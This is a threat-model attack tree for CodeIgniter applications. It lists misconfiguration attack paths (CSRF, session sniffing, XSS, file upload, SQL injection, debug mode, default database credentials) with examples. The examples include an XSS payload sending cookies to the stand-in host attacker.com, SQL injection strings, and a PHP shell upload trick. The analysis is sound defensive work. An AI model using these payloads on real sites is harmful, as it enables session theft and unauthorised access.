# Attack Tree Analysis for bcit-ci/codeigniter

Objective: Gain Unauthorized Access/Execute Arbitrary Code

## Attack Tree Visualization

```
Goal: Gain Unauthorized Access/Execute Arbitrary Code
└── 1. Exploit CodeIgniter Framework Vulnerabilities/Misconfigurations
    ├── 1.1.  Bypass Security Mechanisms  [HIGH RISK]
    │   ├── 1.1.1.  CSRF Protection Bypass (If improperly configured or old version)
    │   │   └── 1.1.1.2.  Bypass token validation due to developer error (e.g., disabling it globally, incorrect form helper usage) [CRITICAL]
    │   ├── 1.1.2.  Session Hijacking/Fixation (Due to weak session management) [HIGH RISK]
    │   │   ├── 1.1.2.3.  Sniff session cookies over insecure connections (if `sess_encrypt_cookie` is FALSE and HTTPS is not enforced) [CRITICAL]
    │   ├── 1.1.3.  Bypass Input Validation (If developer relies solely on client-side validation or misuses CI's validation library) [HIGH RISK]
    │   │   ├── 1.1.3.1.  Submit malicious data directly to the controller, bypassing any client-side checks. [CRITICAL]
    │   └── 1.1.4. Bypass Output Encoding (If developer disables or misconfigures output encoding)
    │       └── 1.1.4.1.  Exploit situations where `xss_clean()` is not used consistently or is bypassed. [CRITICAL]
    ├── 1.2.  Exploit Specific Library/Helper Vulnerabilities
    │   ├── 1.2.1.  File Upload Vulnerabilities (If `Upload` library is misconfigured) [HIGH RISK]
    │   │   ├── 1.2.1.1.  Upload malicious files (e.g., PHP shells) due to insufficient file type validation (relying solely on MIME type, not extension). [CRITICAL]
    │   ├── 1.2.2.  Database Interaction Vulnerabilities (Beyond generic SQLi) [HIGH RISK]
    │   │   ├── 1.2.2.1.  Exploit Active Record vulnerabilities if used improperly (e.g., passing unsanitized user input directly to `where()` clauses). [CRITICAL]
    │   │   └── 1.2.2.3.  Bypass database escaping mechanisms if the developer uses `$this->db->query()` with completely unsanitized input. [CRITICAL]
    └── 1.3.  Exploit Configuration Weaknesses [HIGH RISK]
        ├── 1.3.2.  Insecure Session Configuration (in `config.php`)
        │   └── 1.3.2.3.  Not using HTTPS with `sess_encrypt_cookie = TRUE`. [CRITICAL]
        ├── 1.3.3.  Development Mode Enabled in Production (`ENVIRONMENT` set to 'development') [HIGH RISK]
        │   ├── 1.3.3.1.  Leak sensitive information through verbose error messages. [CRITICAL]
        └── 1.3.4.  Default or Weak Database Credentials
            └── 1.3.4.1.  Gain direct access to the database using default credentials or easily guessable passwords. [CRITICAL]
```

## Attack Tree Path: [1.1. Bypass Security Mechanisms [HIGH RISK]](./attack_tree_paths/1_1__bypass_security_mechanisms__high_risk_.md)

*   **1.1.1.2. Bypass CSRF token validation due to developer error [CRITICAL]**
    *   **Description:** The developer disables CSRF protection globally, forgets to include CSRF tokens in forms, or incorrectly uses the form helper functions, leading to missing or invalid tokens.
    *   **Attack Vector:** An attacker crafts a malicious website or email that, when visited by an authenticated user, sends a forged request to the CodeIgniter application.  Because the CSRF token is missing or invalid, the application processes the request as if it were legitimate.
    *   **Example:** An attacker creates a hidden form on their website that submits a request to `/admin/delete_user?id=123`. If a logged-in administrator visits the attacker's site, the request is sent, and user 123 is deleted.

*   **1.1.2.3. Sniff session cookies over insecure connections [CRITICAL]**
    *   **Description:** The application does not enforce HTTPS, and `sess_encrypt_cookie` is set to `FALSE` (or not set, as it defaults to `FALSE`).  This allows session cookies to be transmitted in plain text.
    *   **Attack Vector:** An attacker on the same network (e.g., public Wi-Fi) uses a packet sniffer to intercept network traffic.  They capture the session cookie of a legitimate user and then use that cookie to impersonate the user.
    *   **Example:** An attacker at a coffee shop uses Wireshark to capture the `ci_session` cookie of a user browsing the vulnerable application.  The attacker then adds this cookie to their own browser and gains access to the user's account.

*   **1.1.3.1. Submit malicious data directly to the controller, bypassing client-side checks [CRITICAL]**
    *   **Description:** The developer relies solely on client-side JavaScript for input validation, or the server-side validation is insufficient.
    *   **Attack Vector:** An attacker uses a tool like Burp Suite or a browser's developer tools to modify the HTTP request and send malicious data directly to the server, bypassing any client-side validation.
    *   **Example:** A form has a field for "age" that is validated in JavaScript to be a number.  An attacker intercepts the request and changes the "age" field to `<script>alert('XSS')</script>`, leading to a cross-site scripting vulnerability.

*   **1.1.4.1. Exploit situations where `xss_clean()` is not used consistently or is bypassed [CRITICAL]**
    *   **Description:** The developer does not consistently use output encoding functions (like `html_escape()` or CodeIgniter's `xss_clean()`) to sanitize user-supplied data before displaying it in the browser.
    *   **Attack Vector:** An attacker injects malicious JavaScript code into a field that is later displayed without proper escaping.  When another user views the page, the malicious script executes in their browser.
    *   **Example:** An attacker enters `<script>document.location='http://attacker.com/?cookie='+document.cookie</script>` into a comment field.  When other users view the comments, their cookies are sent to the attacker's website.

## Attack Tree Path: [1.2. Exploit Specific Library/Helper Vulnerabilities](./attack_tree_paths/1_2__exploit_specific_libraryhelper_vulnerabilities.md)

*   **1.2.1.1. Upload malicious files due to insufficient file type validation [CRITICAL]**
    *   **Description:** The `Upload` library is configured to rely solely on the MIME type provided by the browser, or the allowed extensions list is too permissive.
    *   **Attack Vector:** An attacker uploads a file with a `.php` extension (or another executable extension) disguised as an image (e.g., by changing the MIME type).  The server accepts the file, and the attacker can then execute it by accessing it through a web browser.
    *   **Example:** An attacker uploads a file named `shell.php.jpg` with the MIME type set to `image/jpeg`.  The server accepts the file.  The attacker then accesses `http://example.com/uploads/shell.php.jpg`, and the PHP code within the file is executed.

*   **1.2.2.1. Exploit Active Record vulnerabilities [CRITICAL]**
    *   **Description:** The developer passes unsanitized user input directly to Active Record methods like `where()`, `like()`, etc., without proper escaping.
    *   **Attack Vector:** An attacker injects SQL code into a form field that is used in an Active Record query.  The injected code modifies the query, allowing the attacker to access, modify, or delete data.
    *   **Example:** A search form uses `$this->db->where('title', $this->input->post('search'));`.  An attacker enters `' OR 1=1 --` into the search field, resulting in the query `SELECT * FROM items WHERE title = '' OR 1=1 --`, which retrieves all items.

*   **1.2.2.3. Bypass database escaping mechanisms [CRITICAL]**
    *   **Description:** The developer uses `$this->db->query()` with completely unsanitized user input, bypassing CodeIgniter's built-in escaping mechanisms.
    *   **Attack Vector:** Similar to 1.2.2.1, but even more direct.  The attacker injects SQL code that is executed directly by the database.
    *   **Example:** `$this->db->query("SELECT * FROM users WHERE username = '" . $this->input->post('username') . "'");`. An attacker enters `admin' --` as the username, bypassing authentication.

## Attack Tree Path: [1.3. Exploit Configuration Weaknesses [HIGH RISK]](./attack_tree_paths/1_3__exploit_configuration_weaknesses__high_risk_.md)

*   **1.3.2.3. Not using HTTPS with `sess_encrypt_cookie = TRUE` [CRITICAL]**
    *   **Description:**  (Same as 1.1.2.3) The application does not enforce HTTPS, and `sess_encrypt_cookie` is set to `FALSE`. Session cookies are transmitted in plain text.
    *   **Attack Vector:** (Same as 1.1.2.3) An attacker on the same network intercepts the session cookie and impersonates the user.

*   **1.3.3.1. Leak sensitive information through verbose error messages [CRITICAL]**
    *   **Description:** The `ENVIRONMENT` constant in `index.php` is set to `development`, causing CodeIgniter to display detailed error messages, including file paths, database queries, and stack traces.
    *   **Attack Vector:** An attacker triggers an error (e.g., by providing invalid input) and observes the error message.  The error message reveals sensitive information about the application's internal structure, database schema, and potentially even credentials.
    *   **Example:** An attacker enters an invalid value into a form field, and the resulting error message reveals the full path to the application's configuration file.

*   **1.3.4.1. Gain direct access to the database using default credentials [CRITICAL]**
    *   **Description:** The developer uses the default database credentials (e.g., `root` with no password) or easily guessable credentials.
    *   **Attack Vector:** An attacker attempts to connect to the database using common default credentials or credentials obtained through other means (e.g., social engineering, data breaches).  If successful, the attacker gains full control over the database.
    *   **Example:** An attacker uses the credentials `username: root`, `password: ''` to connect to the application's MySQL database and gains full access.

